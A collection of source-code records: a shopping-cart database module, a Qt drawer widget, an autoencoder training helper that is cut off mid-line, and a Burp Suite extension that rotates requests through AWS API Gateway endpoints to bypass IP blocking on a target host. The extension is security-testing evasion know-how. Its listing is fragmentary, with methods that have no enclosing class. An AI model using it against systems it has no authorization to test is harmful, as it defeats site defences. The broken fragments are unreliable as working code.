{"blob_id": "f6630a1032da700becf127742856cbf36caaf291", "directory_id": "f2e3c95954d7863722a51cdbd09e324d09d1131d", "path": "/mycart/src/db_operations/categories_db.py", "content_id": "70f0642573687e8f7fe1d8fc047b785ab4599913", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "imaskm/myCart", "snapshot_id": "ecba9914df01bd43bd4ca802dc8ea2f53802e732", "revision_id": "f609072193f0467b1d33b153032bc4d49f54cf39", "branch_name": "refs/heads/master", "visit_date": "2022-12-30 04:15:26.281206", "revision_date": "2020-10-07 20:47:00", "committer_date": "2020-10-07 20:47:00", "github_id": "300064659", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2342", "extension": "py", "content": "from mycart.scripts import init\n\n\ndef get_all_categories():\n    try:\n        db_conn = None\n        db_conn = init.create_connection()\n        cursor = db_conn.cursor()\n        sql_cmd = 'SELECT id,name from categories;'\n        cursor.execute(sql_cmd)\n        result = cursor.fetchall()\n        return result if result else None\n    except:\n        return\n    finally:\n        if db_conn:\n            db_conn.close()\n\n\ndef get_category_names_for_product(product_id):\n\n    try:\n        db_conn = None\n        db_conn = init.create_connection()\n        cursor = db_conn.cursor()\n        sql_cmd = 'SELECT name FROM categories as c WHERE c.id IN' \\\n                  '(SELECT category_id FROM productcategories WHERE product_id=?);'\n        cursor.execute(sql_cmd, (product_id,))\n        result = cursor.fetchall()\n        return result if result else None\n    except:\n        return\n    finally:\n        if db_conn:\n            db_conn.close()\n\n\ndef get_category_id_from_name(category_name):\n    try:\n        db_conn = None\n        db_conn = init.create_connection()\n        cursor = db_conn.cursor()\n        sql_cmd = 'SELECT id FROM categories WHERE name=?;'\n        cursor.execute(sql_cmd, (category_name,))\n        result = cursor.fetchone()\n        return result[0] if result else None\n    except:\n        return\n    finally:\n        if db_conn:\n            db_conn.close()\n\n\ndef get_category_names_for_all_product():\n\n    try:\n        db_conn = None\n        db_conn = init.create_connection()\n        cursor = db_conn.cursor()\n        sql_cmd = 'SELECT pc.product_id,name FROM categories as c INNER JOIN productcategories as pc ON ' \\\n                  'c.id=pc.category_id;'\n        cursor.execute(sql_cmd)\n        result = cursor.fetchall()\n        return result if result else None\n\n    except:\n        return\n    finally:\n        if db_conn:\n            db_conn.close()\n\n\ndef insert_new_category(category_name):\n\n    try:\n        db_conn = None\n        db_conn = init.create_connection()\n        cursor = db_conn.cursor()\n        sql_cmd = 'INSERT INTO categories(name) VALUES(?);'\n        cursor.execute(sql_cmd, (category_name,))\n\n        result = cursor.lastrowid\n        if result:\n            db_conn.commit()\n            return result\n    except:\n        return None\n    finally:\n        if db_conn:\n            db_conn.close()"}
{"blob_id": "03275254b3cabb6ecf188f764882ebb11a1d10ea", "directory_id": "eb7680e9a989e3e8567868b251251b01bc9808fc", "path": "/dayu_widgets/drawer.py", "content_id": "ccc6583ab512b4676725eedb80d02e26c6ae1de9", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "FXTD-ODYSSEY/dayu_widgets", "snapshot_id": "47a9141b1a6732e2e33221e5636c5700fe62febc", "revision_id": "89ece75c59ebd781b7b539f8b6390cc0e9126ad9", "branch_name": "refs/heads/master", "visit_date": "2022-04-23 01:51:15.387620", "revision_date": "2020-04-22 06:49:22", "committer_date": "2020-04-22 06:49:22", "github_id": "257323975", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "MIT", "gha_event_created_at": "2020-04-20 15:28:28", "gha_created_at": "2020-04-20 15:28:27", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "10049", "extension": "py", "content": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n###################################################################\n# Author: Mu yanru\n# Date  : 2019.6\n# Email : muyanru345@163.com\n###################################################################\n\"\"\"MDrawer\"\"\"\nfrom dayu_widgets.divider import MDivider\nfrom dayu_widgets.tool_button import MToolButton\nfrom dayu_widgets.label import MLabel\nfrom dayu_widgets import dayu_theme\nfrom dayu_widgets.qt import QEvent,QWidget, Qt, Signal, QHBoxLayout, QTimer, QPropertyAnimation, \\\n    QEasingCurve, QAbstractAnimation, QGraphicsDropShadowEffect, QPoint, Property, QScrollArea, QVBoxLayout, QFrame , QApplication\n\nimport time\nclass MDrawer(QWidget):\n    \"\"\"\n    A panel which slides in from the edge of the screen.\n    \"\"\"\n    LeftPos = 'left'\n    RightPos = 'right'\n    TopPos = 'top'\n    BottomPos = 'bottom'\n\n    sig_closed = Signal()\n\n    def __init__(self, title, position='right', closable=True, parent=None):\n        super(MDrawer, self).__init__(parent)\n        self.setObjectName('message')\n        # self.setWindowFlags(Qt.Popup )\n        # self.setWindowFlags(\n        #     Qt.FramelessWindowHint | Qt.Popup | Qt.WA_TranslucentBackground)\n        self.setAttribute(Qt.WA_StyledBackground)\n\n        self._title_label = MLabel(parent=self).h4()\n        # self._title_label.set_elide_mode(Qt.ElideRight)\n        self._title_label.setText(title)\n\n        self._close_button = MToolButton(parent=self).icon_only().svg('close_line.svg').small()\n        self._close_button.clicked.connect(self.close)\n        self._close_button.setVisible(closable or False)\n\n        _title_lay = QHBoxLayout()\n        _title_lay.addWidget(self._title_label)\n        _title_lay.addStretch()\n        _title_lay.addWidget(self._close_button)\n        self._button_lay = QHBoxLayout()\n        self._button_lay.addStretch()\n\n        self._scroll_area = QScrollArea()\n        self._main_lay = QVBoxLayout()\n        self._main_lay.addLayout(_title_lay)\n        self._main_lay.addWidget(MDivider())\n        self._main_lay.addWidget(self._scroll_area)\n        self._main_lay.addWidget(MDivider())\n        self._main_lay.addLayout(self._button_lay)\n        self.setLayout(self._main_lay)\n\n        self._position = position\n\n        self._close_timer = QTimer(self)\n        self._close_timer.setSingleShot(True)\n        self._close_timer.timeout.connect(self.close)\n        self._close_timer.timeout.connect(self.sig_closed)\n        self._close_timer.setInterval(300)\n        self._is_first_close = True\n\n        self._pos_ani = QPropertyAnimation(self)\n        self._pos_ani.setTargetObject(self)\n        self._pos_ani.setEasingCurve(QEasingCurve.OutCubic)\n        self._pos_ani.setDuration(300)\n        self._pos_ani.setPropertyName('pos')\n\n        self._opacity_ani = QPropertyAnimation()\n        self._opacity_ani.setTargetObject(self)\n        self._opacity_ani.setDuration(300)\n        self._opacity_ani.setEasingCurve(QEasingCurve.OutCubic)\n        self._opacity_ani.setPropertyName('windowOpacity')\n        self._opacity_ani.setStartValue(0.0)\n        self._opacity_ani.setEndValue(1.0)\n        # self._shadow_effect = QGraphicsDropShadowEffect(self)\n        # color = dayu_theme.red\n        # self._shadow_effect.setColor(color)\n        # self._shadow_effect.setOffset(0, 0)\n        # self._shadow_effect.setBlurRadius(5)\n        # self._shadow_effect.setEnabled(False)\n        # self.setGraphicsEffect(self._shadow_effect)\n\n        self.app = QApplication.instance()\n        self.app.installEventFilter(self)\n        self.protect_time = time.time()\n\n\n    def retrieveChildren(self,parent,receiver):\n        if parent is receiver:\n            return True\n        if not hasattr(parent,\"children\"):\n            return\n\n        for child in parent.children():\n            \n            ret = self.retrieveChildren(child,receiver)\n            if ret:\n                return ret\n\n    def eventFilter(self,receiver,event):\n        # Note QEvent.Type.MouseButtonPress \u4e3a 2\n        if event.type() == 2:\n            if self.retrieveChildren(self,receiver):\n                self.protect_time = time.time()\n            # NOTE \u5982\u679c\u70b9\u51fb\u591a\u6b21\u89e6\u53d1\uff0c\u901a\u8fc7\u65f6\u95f4\u8fdb\u884c\u4fdd\u62a4\n            if (time.time() - self.protect_time) > .1:\n                self.close()\n        elif event.type() == QEvent.Type.Resize and receiver is self.window():\n            self.close()\n        return False\n\n    def set_widget(self, widget):\n        self._scroll_area.setWidget(widget)\n\n    def add_button(self, button):\n        self._button_lay.addWidget(button)\n\n    def _fade_out(self):\n        self._pos_ani.setDirection(QAbstractAnimation.Backward)\n        self._pos_ani.start()\n        self._opacity_ani.setDirection(QAbstractAnimation.Backward)\n        self._opacity_ani.start()\n\n    def _fade_int(self):\n        self._pos_ani.start()\n        self._opacity_ani.start()\n\n    def _set_proper_position(self):\n        parent = self.parent()\n        parent_geo = parent.geometry()\n        if self._position == MDrawer.LeftPos:\n            pos = parent_geo.topLeft() if parent.parent() is None else parent.mapToGlobal(\n                parent_geo.topLeft())\n            pos -= self.window().geometry().topLeft()\n            target_x = pos.x()\n            target_y = pos.y()\n            self.setFixedHeight(parent_geo.height())\n            self._pos_ani.setStartValue(QPoint(target_x - self.width(), target_y))\n            self._pos_ani.setEndValue(QPoint(target_x, target_y))\n        if self._position == MDrawer.RightPos:\n            pos = parent_geo.topRight() if parent.parent() is None else parent.mapToGlobal(\n                parent_geo.topRight())\n            pos -= self.window().geometry().topLeft()\n            self.setFixedHeight(parent_geo.height())\n            target_x = pos.x() - self.width()\n            target_y = pos.y()\n            self._pos_ani.setStartValue(QPoint(target_x + self.width(), target_y))\n            self._pos_ani.setEndValue(QPoint(target_x, target_y))\n        if self._position == MDrawer.TopPos:\n            pos = parent_geo.topLeft() if parent.parent() is None else parent.mapToGlobal(\n                parent_geo.topLeft())\n            pos -= self.window().geometry().topLeft()\n            self.setFixedWidth(parent_geo.width())\n            target_x = pos.x()\n            target_y = pos.y()\n            self._pos_ani.setStartValue(QPoint(target_x, target_y - self.height()))\n            self._pos_ani.setEndValue(QPoint(target_x, target_y))\n        if self._position == MDrawer.BottomPos:\n            pos = parent_geo.bottomLeft() if parent.parent() is None else parent.mapToGlobal(\n                parent_geo.bottomLeft())\n            pos -= self.window().geometry().topLeft()\n            self.setFixedWidth(parent_geo.width())\n            target_x = pos.x()\n            target_y = pos.y() - self.height()\n            self._pos_ani.setStartValue(QPoint(target_x, target_y + self.height()))\n            self._pos_ani.setEndValue(QPoint(target_x, target_y))\n\n    def set_dayu_position(self, value):\n        \"\"\"\n        Set the placement of the MDrawer.\n        top/right/bottom/left, default is right\n        :param value: str\n        :return: None\n        \"\"\"\n        self._position = value\n        if value in [MDrawer.BottomPos, MDrawer.TopPos]:\n            self.setFixedHeight(200)\n        else:\n            self.setFixedWidth(200)\n\n    def get_dayu_position(self):\n        \"\"\"\n        Get the placement of the MDrawer\n        :return: str\n        \"\"\"\n        return self._position\n\n    dayu_position = Property(str, get_dayu_position, set_dayu_position)\n\n    def left(self):\n        \"\"\"Set drawer's placement to left\"\"\"\n        self.set_dayu_position(MDrawer.LeftPos)\n        return self\n\n    def right(self):\n        \"\"\"Set drawer's placement to right\"\"\"\n        self.set_dayu_position(MDrawer.RightPos)\n        return self\n\n    def top(self):\n        \"\"\"Set drawer's placement to top\"\"\"\n        self.set_dayu_position(MDrawer.TopPos)\n        return self\n\n    def bottom(self):\n        \"\"\"Set drawer's placement to bottom\"\"\"\n        self.set_dayu_position(MDrawer.BottomPos)\n        return self\n\n    def show(self):\n        self._set_proper_position()\n        self._fade_int()\n        return super(MDrawer, self).show()\n\n    def closeEvent(self, event):\n        self.app.removeEventFilter(self)\n        if self._is_first_close:\n            self._is_first_close = False\n            self._close_timer.start()\n            self._fade_out()\n            event.ignore()\n        else:\n            event.accept()\n\nclass MLoadingWrapper(QWidget):\n    \"\"\"\n    A wrapper widget to show the loading widget or hide.\n    Property:\n        dayu_loading: bool. current loading state.\n    \"\"\"\n    def __init__(self, loading=True, parent=None):\n        super(MLoadingWrapper, self).__init__(parent)\n        self._mask_widget = QFrame()\n        self._mask_widget.setObjectName('mask')\n        self._mask_widget.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)\n        self._loading_widget = MLoading()\n        self._loading_widget.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)\n\n        self._main_lay = QGridLayout()\n        self._main_lay.setContentsMargins(0, 0, 0, 0)\n        self._main_lay.addWidget(self._mask_widget, 0, 0)\n        self._main_lay.addWidget(self._loading_widget, 0, 0, Qt.AlignCenter)\n        self.setLayout(self._main_lay)\n        self._loading = None\n        self.set_dayu_loading(loading)\n\n    def _set_loading(self):\n        self._loading_widget.setVisible(self._loading)\n        self._mask_widget.setVisible(self._loading)\n\n    def set_dayu_loading(self, loading):\n        \"\"\"\n        Set current state to loading or not\n        :param loading: bool\n        :return: None\n        \"\"\"\n        self._loading = loading\n        self._set_loading()\n\n    def get_dayu_loading(self):\n        \"\"\"\n        Get current loading widget is loading or not.\n        :return: bool\n        \"\"\"\n        return self._loading\n\n    dayu_loading = Property(bool, get_dayu_loading, set_dayu_loading)\n"}
{"blob_id": "0ad708e962e9852f4f76cb3fbf7e4ac9373d4548", "directory_id": "2916caaab9df601097ade48a06a69e911c4de3fe", "path": "/aws_ip_gateway.py", "content_id": "098fe357204df25a23c80fa67016721d4d120deb", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "ankh2054/oig-backend", "snapshot_id": "74bc518e363cbe6e6e918c729258696caea99e29", "revision_id": "26fb9ebe295695e8e26ba1a9cb5501d44dec4cbd", "branch_name": "refs/heads/main", "visit_date": "2023-06-18 11:18:29.811326", "revision_date": "2021-07-13 13:43:21", "committer_date": "2021-07-13 13:43:21", "github_id": "385613035", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11829", "extension": "py", "content": "#AUTHOR: Dave Yesland @daveysec, Rhino Security Labs @rhinosecurity\n#Burp Suite extension which uses AWS API Gateway to change your IP on every request to bypass IP blocking.\n#More Info: https://rhinosecuritylabs.com/aws/bypassing-ip-based-blocking-aws/\n\nfrom javax.swing import JPanel, JTextField, JButton, JLabel, BoxLayout, JPasswordField, JCheckBox, JRadioButton, ButtonGroup\nfrom burp import IBurpExtender, IExtensionStateListener, ITab, IHttpListener\nfrom java.awt import GridLayout\nimport boto3\nimport re\n\nEXT_NAME = 'IP Rotate'\nENABLED = '<html><h2><font color=\"green\">Enabled</font></h2></html>'\nDISABLED = '<html><h2><font color=\"red\">Disabled</font></h2></html>'\nSTAGE_NAME = 'burpendpoint'\nAPI_NAME = 'BurpAPI'\nAVAIL_REGIONS = [\n\t\"us-east-1\",\"us-west-1\",\"us-east-2\",\n\t\"us-west-2\",\"eu-central-1\",\"eu-west-1\",\n\t\"eu-west-2\",\"eu-west-3\",\"sa-east-1\",\"eu-north-1\"\n]\n\n\tdef getTargetProtocol(self):\n\t\tif self.https_button.isSelected() == True:\n\t\t\treturn 'https'\n\t\telse:\n\t\t\treturn 'http'\n\n\tdef getRegions(self):\n\t\tself.enabled_regions = {}\n\t\tfor region in AVAIL_REGIONS:\n\t\t\tcur_region = region.replace('-','_')\n\t\t\tcur_region = cur_region+'_status'\n\t\t\tregion_status = getattr(self,cur_region)\n\t\t\tif region_status.isSelected():\n\t\t\t\t#dict to contain the running regions and API gateway IDs\n\t\t\t\tself.enabled_regions.update({region:''})\n\t\treturn\n\n\n#AWS functions\n\n\t#Uses boto3 to test the AWS keys and make sure they are valid NOT IMPLEMENTED\n\tdef testKeys(self):\n\t\treturn\n\n\t#Uses boto3 to spin up an API Gateway\n\tdef startAPIGateway(self):\n\t\tself.getRegions()\n\t\tfor region in self.enabled_regions.keys():\n\t\t\tself.awsclient = boto3.client('apigateway',\n\t\t\t\taws_access_key_id=self.access_key.text,\n\t\t\t\taws_secret_access_key=self.secret_key.text,\n\t\t\t\tregion_name=region\n\t\t\t)\n\n\t\t\tself.create_api_response = self.awsclient.create_rest_api(\n\t\t\t\tname=API_NAME,\n\t\t\t\tendpointConfiguration={\n\t\t\t\t\t'types': [\n\t\t\t\t\t\t'REGIONAL',\n\t\t\t\t\t]\n\t\t\t\t}\n\t\t\t)\n\n\t\t\tget_resource_response = self.awsclient.get_resources(\n\t\t\t\trestApiId=self.create_api_response['id']\n\t\t\t)\n\t\t\t\n\t\t\tself.restAPIId = self.create_api_response['id']\n\t\t\tself.enabled_regions[region] = self.restAPIId\n\n\t\t\tcreate_resource_response = self.awsclient.create_resource(\n\t\t\t\trestApiId=self.create_api_response['id'],\n\t\t\t\tparentId=get_resource_response['items'][0]['id'],\n\t\t\t\tpathPart='{proxy+}'\n\t\t\t)\n\t\t\t\n\t\t\tself.awsclient.put_method(\n\t\t\t\trestApiId=self.create_api_response['id'],\n\t\t\t\tresourceId=get_resource_response['items'][0]['id'],\n\t\t\t\thttpMethod='ANY',\n\t\t\t\tauthorizationType='NONE',\n\t\t\t\trequestParameters={\n\t\t\t\t\t'method.request.path.proxy':True,\n\t\t\t\t\t'method.request.header.X-My-X-Forwarded-For':True\n                                }\n\t\t\t)\n\n\t\t\tself.awsclient.put_integration(\n\t\t\t\trestApiId=self.create_api_response['id'],\n\t\t\t\tresourceId=get_resource_response['items'][0]['id'],\n\t\t\t\ttype='HTTP_PROXY',\n\t\t\t\thttpMethod='ANY',\n\t\t\t\tintegrationHttpMethod='ANY',\n\t\t\t\turi=self.getTargetProtocol()+'://'+self.target_host.text + '/',\n\t\t\t\tconnectionType='INTERNET',\n\t\t\t\trequestParameters={\n\t\t\t\t\t'integration.request.path.proxy':'method.request.path.proxy',\n                                        'integration.request.header.X-Forwarded-For': 'method.request.header.X-My-X-Forwarded-For'\n\t\t\t\t}\n\t\t\t)\n\n\t\t\tself.awsclient.put_method(\n\t\t\t\trestApiId=self.create_api_response['id'],\n\t\t\t\tresourceId=create_resource_response['id'],\n\t\t\t\thttpMethod='ANY',\n\t\t\t\tauthorizationType='NONE',\n\t\t\t\trequestParameters={\n\t\t\t\t\t'method.request.path.proxy':True,\n\t\t\t\t\t'method.request.header.X-My-X-Forwarded-For':True\n\t\t\t\t}\n\t\t\t)\n\n\t\t\tself.awsclient.put_integration(\n\t\t\t\trestApiId=self.create_api_response['id'],\n\t\t\t\tresourceId=create_resource_response['id'],\n\t\t\t\ttype= 'HTTP_PROXY', \n\t\t\t\thttpMethod= 'ANY',\n\t\t\t\tintegrationHttpMethod='ANY',\n\t\t\t\turi= self.getTargetProtocol()+'://'+self.target_host.text+'/{proxy}',\n\t\t\t\tconnectionType= 'INTERNET',\n\t\t\t\trequestParameters={\n\t\t\t\t\t'integration.request.path.proxy':'method.request.path.proxy',\n                                        'integration.request.header.X-Forwarded-For': 'method.request.header.X-My-X-Forwarded-For'\n\t\t\t\t}\n\t\t\t)\n\n\t\t\tself.deploy_response = self.awsclient.create_deployment(\n\t\t\t\trestApiId=self.restAPIId,\n\t\t\t\tstageName=STAGE_NAME\n\n\t\t\t)\n\n\t\t\tself.allEndpoints.append(self.restAPIId+'.execute-api.'+region+'.amazonaws.com')\n\t\t\t\n\t\t\tself.usage_response = self.awsclient.create_usage_plan(\n\t\t\t\tname='burpusage',\n\t\t\t\tdescription=self.restAPIId,\n\t\t\t\tapiStages=[\n\t\t\t\t\t{\n\t\t\t\t\t'apiId': self.restAPIId,\n\t\t\t\t\t'stage': STAGE_NAME\n\t\t\t\t\t}\n\t\t\t\t]\n\t\t\t)\n\n\t\t#Print out some info to burp console\n\t\tprint 'Following regions and API IDs started:'\n\t\tprint self.enabled_regions\n\t\tprint 'List of endpoints being used:'\n\t\tprint self.allEndpoints\n\t\treturn\n\n\t#Uses boto3 to delete the API Gateway\n\tdef deleteAPIGateway(self):\n\t\tif self.enabled_regions:\n\t\t\tfor region in self.enabled_regions.keys():\n\t\t\t\tself.awsclient = boto3.client('apigateway',\n\t\t\t\t\taws_access_key_id=self.access_key.text,\n\t\t\t\t\taws_secret_access_key=self.secret_key.text,\n\t\t\t\t\tregion_name=region\n\t\t\t\t)\n\n\t\t\t\tresponse = self.awsclient.delete_rest_api(\n\t\t\t\t\trestApiId=self.enabled_regions[region]\n\t\t\t\t)\n\t\t\t\tprint response\n\t\tself.enabled_regions = {}\n\t\tself.allEndpoints = []\n\t\treturn\n\n\t#Called on \"save\" button click to save the settings\n\tdef saveKeys(self, event):\n\t\taws_access_key_id=self.access_key.text\n\t\taws_secret_access_key=self.secret_key.text\n\t\tself.callbacks.saveExtensionSetting(\"aws_access_key_id\", aws_access_key_id)\n\t\tself.callbacks.saveExtensionSetting(\"aws_secret_access_key\", aws_secret_access_key)\n\t\treturn\n\n\t#Called on \"Enable\" button click to spin up the API Gateway\n\tdef enableGateway(self, event):\n\t\tself.startAPIGateway()\n\t\tself.status_indicator.text = ENABLED\n\t\tself.isEnabled = True\n\t\tself.enable_button.setEnabled(False)\n\t\tself.secret_key.setEnabled(False)\n\t\tself.access_key.setEnabled(False)\n\t\tself.target_host.setEnabled(False)\n\t\tself.disable_button.setEnabled(True)\n\t\treturn\n\n\t#Called on \"Disable\" button click to delete API Gateway\n\tdef disableGateway(self, event):\n\t\tself.deleteAPIGateway()\n\t\tself.status_indicator.text = DISABLED\n\t\tself.isEnabled = False\n\t\tself.enable_button.setEnabled(True)\n\t\tself.secret_key.setEnabled(True)\n\t\tself.access_key.setEnabled(True)\n\t\tself.target_host.setEnabled(True)\n\t\tself.disable_button.setEnabled(False)\n\t\treturn\n\n\tdef getCurrEndpoint():\n\n\t\treturn \n\n\t#Traffic redirecting\n\tdef processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):\n\t\t# only process requests\n\t\tif not messageIsRequest or not self.isEnabled:\n\t\t\treturn\n\n\t\t# get the HTTP service for the request\n\t\thttpService = messageInfo.getHttpService()\n\n\t\t#Modify the request host, host header, and path to point to the new API endpoint\n\t\t#Should always use HTTPS because API Gateway only uses HTTPS\n\t\tif ':' in self.target_host.text: #hacky fix for https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension/issues/14\n\t\t\thost_no_port = self.target_host.text.split(':')[0]\n\t\t\t\n\t\telse:\n\t\t\thost_no_port = self.target_host.text\n\n\t\tif (host_no_port == httpService.getHost()):\n\t\t\t#Cycle through all the endpoints each request until then end of the list is reached\n\t\t\tif self.currentEndpoint < len(self.allEndpoints)-1:\n\t\t\t\tself.currentEndpoint += 1\n\t\t\t#Reset to 0 when end it reached\n\t\t\telse:\n\t\t\t\tself.currentEndpoint = 0\n\t\t\t\n\t\t\tmessageInfo.setHttpService(\n\t\t\t\tself.helpers.buildHttpService(\n\t\t\t\t\tself.allEndpoints[self.currentEndpoint],\n\t\t\t\t\t443, True\n\t\t\t\t)\n\t\t\t)\n\n\t\t\trequestInfo = self.helpers.analyzeRequest(messageInfo)\n\t\t\tnew_headers = requestInfo.headers\n\n\t\t\t#Update the path to point to the API Gateway path\n\t\t\treq_head = new_headers[0]\n\t\t\t#hacky fix for https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension/issues/14\n\t\t\tif 'http://' in req_head or 'https://' in req_head:\n\t\t\t\tcur_path = re.findall('https?:\\/\\/.*?\\/(.*) ',req_head)[0]\n\t\t\t\tnew_headers[0] = re.sub(' (.*?) ',\" /\"+STAGE_NAME+\"/\"+cur_path+\" \",req_head)\n\n\t\t\telse:\n\t\t\t\tnew_headers[0] = re.sub(' \\/',\" /\"+STAGE_NAME+\"/\",req_head)\n\n\t\t\t#Replace the Host header with the Gateway host\n\t\t\tfor header in new_headers:\n\t\t\t\tif header.startswith('Host: '):\n\t\t\t\t\thost_header_index = new_headers.index(header)\n\t\t\t\t\tnew_headers[host_header_index] = 'Host: '+self.allEndpoints[self.currentEndpoint]\n\n\t\t\t#Update the headers insert the existing body\n\t\t\tbody = messageInfo.request[requestInfo.getBodyOffset():len(messageInfo.request)]\n\t\t\tmessageInfo.request = self.helpers.buildHttpMessage(\n\t\t\t\t\t\t\t\tnew_headers,\n\t\t\t\t\t\t\t\tbody\n\t\t\t\t\t\t\t)\n\n\t#Tab name\n\tdef getTabCaption(self):\n\t\treturn EXT_NAME\n\n\t#Handle extension unloading\n\tdef extensionUnloaded(self):\n\t\tself.deleteAPIGateway()\n\t\treturn\n\n\t#Layout the UI\n\tdef getUiComponent(self):\n\t\taws_access_key_id = self.callbacks.loadExtensionSetting(\"aws_access_key_id\")\n\t\taws_secret_accesskey = self.callbacks.loadExtensionSetting(\"aws_secret_access_key\")\n\t\tif aws_access_key_id:\n\t\t\tself.aws_access_key_id = aws_access_key_id\n\t\tif aws_secret_accesskey:\n\t\t\tself.aws_secret_accesskey = aws_secret_accesskey\n\n\t\tself.panel = JPanel()\n\n\t\tself.main = JPanel()\n\t\tself.main.setLayout(BoxLayout(self.main, BoxLayout.Y_AXIS))\n\n\t\tself.access_key_panel = JPanel()\n\t\tself.main.add(self.access_key_panel)\n\t\tself.access_key_panel.setLayout(BoxLayout(self.access_key_panel, BoxLayout.X_AXIS))\n\t\tself.access_key_panel.add(JLabel('Access Key: '))\n\t\tself.access_key = JTextField(self.aws_access_key_id,25)\n\t\tself.access_key_panel.add(self.access_key)\n\n\t\tself.secret_key_panel = JPanel()\n\t\tself.main.add(self.secret_key_panel)\n\t\tself.secret_key_panel.setLayout(BoxLayout(self.secret_key_panel, BoxLayout.X_AXIS))\n\t\tself.secret_key_panel.add(JLabel('Secret Key: '))\n\t\tself.secret_key = JPasswordField(self.aws_secret_accesskey,25)\n\t\tself.secret_key_panel.add(self.secret_key)\n\n\t\tself.target_host_panel = JPanel()\n\t\tself.main.add(self.target_host_panel)\n\t\tself.target_host_panel.setLayout(BoxLayout(self.target_host_panel, BoxLayout.X_AXIS))\n\t\tself.target_host_panel.add(JLabel('Target host: '))\n\t\tself.target_host = JTextField('example.com', 25)\n\t\tself.target_host_panel.add(self.target_host)\n\n\t\tself.buttons_panel = JPanel()\n\t\tself.main.add(self.buttons_panel)\n\t\tself.buttons_panel.setLayout(BoxLayout(self.buttons_panel, BoxLayout.X_AXIS))\n\t\tself.save_button = JButton('Save Keys', actionPerformed = self.saveKeys)\n\t\tself.buttons_panel.add(self.save_button)\n\t\tself.enable_button = JButton('Enable', actionPerformed = self.enableGateway)\n\t\tself.buttons_panel.add(self.enable_button)\n\t\tself.disable_button = JButton('Disable', actionPerformed = self.disableGateway)\n\t\tself.buttons_panel.add(self.disable_button)\n\t\tself.disable_button.setEnabled(False)\n\n\t\tself.protocol_panel = JPanel()\n\t\tself.main.add(self.protocol_panel)\n\t\tself.protocol_panel.setLayout(BoxLayout(self.protocol_panel, BoxLayout.Y_AXIS))\n\t\tself.protocol_panel.add(JLabel(\"Target Protocol:\"))\n\t\tself.https_button = JRadioButton(\"HTTPS\",True)\n\t\tself.http_button = JRadioButton(\"HTTP\",False)\n\t\tself.protocol_panel.add(self.http_button)\n\t\tself.protocol_panel.add(self.https_button)\n\t\tbuttongroup = ButtonGroup()\n\t\tbuttongroup.add(self.https_button)\n\t\tbuttongroup.add(self.http_button)\n\n\t\tself.regions_title = JPanel()\n\t\tself.main.add(self.regions_title)\n\t\tself.regions_title.add(JLabel(\"Regions to launch API Gateways in:\"))\n\n\t\tself.regions_panel = JPanel()\n\t\tself.main.add(self.regions_panel)\n\t\tglayout = GridLayout(4,3)\n\t\tself.regions_panel.setLayout(glayout)\n\t\tfor region in AVAIL_REGIONS:\n\t\t\tcur_region = region.replace('-','_')\n\t\t\tcur_region = cur_region+'_status'\n\t\t\tsetattr(self,cur_region,JCheckBox(region,True))\n\t\t\tattr = getattr(self,cur_region)\n\t\t\tself.regions_panel.add(attr)\n\n\t\tself.status = JPanel()\n\t\tself.main.add(self.status)\n\t\tself.status.setLayout(BoxLayout(self.status, BoxLayout.X_AXIS))\n\t\tself.status_indicator = JLabel(DISABLED,JLabel.CENTER)\n\t\tself.status.add(self.status_indicator)\n\t\t\n\t\tself.panel.add(self.main)\n\t\treturn self.panel\n"}
{"blob_id": "d25920dcaa4a18241b873645cf8537cf8d9ac2a6", "directory_id": "4774a8ff75605186f87b5353f247f75a601d9548", "path": "/VAE/utilities.py", "content_id": "da104d533aec0b30b11c593674504ac7671c8d6f", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Razcle/VAE", "snapshot_id": "4a23a850a7e8fd7216caa4b02b5e8c898d4a3148", "revision_id": "1201444bdc351b6fe8dfcaac7aefcaa4479e585f", "branch_name": "refs/heads/master", "visit_date": "2021-01-11 00:11:35.592036", "revision_date": "2017-01-18 15:56:37", "committer_date": "2017-01-18 15:56:37", "github_id": "70581009", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "2432", "extension": "py", "content": "\nimport VAE\nimport numpy as np\nfrom scipy.io import loadmat\nimport tensorflow as tf\n\n\ndef train(input_data, network_architecture, learning_rate=0.001,\n          batch_size=50, training_epochs=10, display_step=10, kind='frey'):\n    if kind == 'frey':\n        vae = VAE.VariationalAutoencoder(network_architecture,\n                                         learning_rate=learning_rate,\n                                         batch_size=batch_size)\n    if kind == 'mnist':\n        vae = VAE.VariationalAutoencoder_Mnist(network_architecture,\n                                         learning_rate=learning_rate,\n                                         batch_size=batch_size)\n\n    n_samples = np.shape(input_data)[0]\n    # Training cycle\n    for epoch in range(training_epochs):\n        avg_cost = 0.\n        # Loop over all batches\n        for batch_xs in iterate_minibatches(input_data, batch_size):\n\n            # Fit training using batch data\n            cost = vae.partial_fit(batch_xs)\n\n            # Compute average loss\n            avg_cost += cost / n_samples * batch_size\n\n        # Display logs per epoch step\n        if epoch % display_step == 0:\n            print \"Epoch:\", '%04d' % (epoch+1), \\\n                  \"cost=\", \"{:.9f}\".format(avg_cost)\n    return vae\n\n\ndef load_frey_faces(test_prop=0.2):\n\n    data = np.transpose(loadmat('../Data/frey_rawface.mat')['ff'])\n    data = np.array([n / float(max(n) + 1) for n in data])\n\n    N = data.shape[0]\n\n    train = data[int(N*test_prop):]\n    test = data[: int(N*test_prop)]\n\n    return train, test\n\n\ndef iterate_minibatches(X, batch_size, y=None, 